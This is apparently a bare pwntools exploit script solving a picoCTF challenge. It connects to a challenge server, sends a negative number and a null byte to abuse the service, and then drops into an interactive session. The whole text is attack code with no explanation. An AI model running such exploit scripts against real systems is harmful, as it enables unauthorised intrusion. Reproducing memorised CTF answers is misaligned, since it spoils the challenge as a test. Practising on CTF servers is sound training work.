from pwn import *
r = remote('mercury.picoctf.net', 17612)
r.sendline(b'-5144')
r.sendline(b'\x00')
r.interactive()

